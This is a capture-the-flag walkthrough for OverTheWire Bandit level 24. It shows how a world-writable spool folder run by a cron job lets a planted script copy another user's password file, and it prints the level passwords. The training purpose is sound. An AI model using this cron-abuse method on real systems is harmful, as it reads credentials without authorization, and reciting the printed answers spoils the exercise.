# ![](https://overthewire.org/img/domokitten.png)

# Bandit_Level24

## Source:
- [Bandit_Level24] - The topic of Bandit, Level24.
###
### I. Connect:
```sh
ssh -p 2220 bandit23@bandit.labs.overthewire.org
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
### II. My solution:
-  We start as the same way in level22:
```sh
bandit23@bandit:~$ ls -la /etc/cron.d
total 56
drwxr-xr-x   2 root root  4096 Apr 23 18:05 .
drwxr-xr-x 108 root root 12288 Aug 12 08:42 ..
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit22
-rw-r--r--   1 root root   122 Apr 23 18:04 cronjob_bandit23
-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit24
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Apr 23 18:05 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24/sh
cat: /usr/bin/cronjob_bandit24/sh: No such file or directory
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

```
- The script executes and deletes all files in the folder ‘/var/spool/bandit24/foo’. This is the case because it is run as bandit24 user, so the variable ‘myname’ contains the value ‘bandit24’. The for loop goes through the files. The first if statement makes sure the directories ‘.’ and ‘..’, which are representing the current and previous folders, are ignored. Inside the if statement is the code to execute a script, but only if the owner is bandit23. Then the file will be deleted.
- Lets make a folder in the /tmp directory and use that as the base location for all the operations here on out.
```sh
bandit23@bandit:~$ mktemp -d
/tmp/tmp.dbJd6RvOoq
bandit23@bandit:~$ cd /tmp/tmp.dbJd6RvOoq
```
- Create a file called script.sh using nano and write the following code in the file.
```sh
bandit23@bandit:/tmp/tmp.dbJd6RvOoq$ nano script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.dbJd6RvOoq/password
```
- Then we create a 'password' file to store the password:
```sh
bandit23@bandit:/tmp/tmp.dbJd6RvOoq$ touch password
```
- Now we only need to give the necessary permissions to the folder and the file.
```sh
bandit23@bandit:/tmp/tmp.dbJd6RvOoq$ chmod 777 -R /tmp/tmp.dbJd6RvOoq
```
-  copy the script in the bandit24/foo folder from where the cron job should execute our file.
```sh
bandit23@bandit:/tmp/tmp.dbJd6RvOoq$ cp script.sh /var/spool/bandit24/foo/
```
- Lets view the content of password file
```sh
bandit23@bandit:/tmp/tmp.dbJd6RvOoq$ cat password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
### III. Result:
The password for 'bandit24': VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

[Bandit_Level24]: <https://overthewire.org/wargames/bandit/bandit24.html>
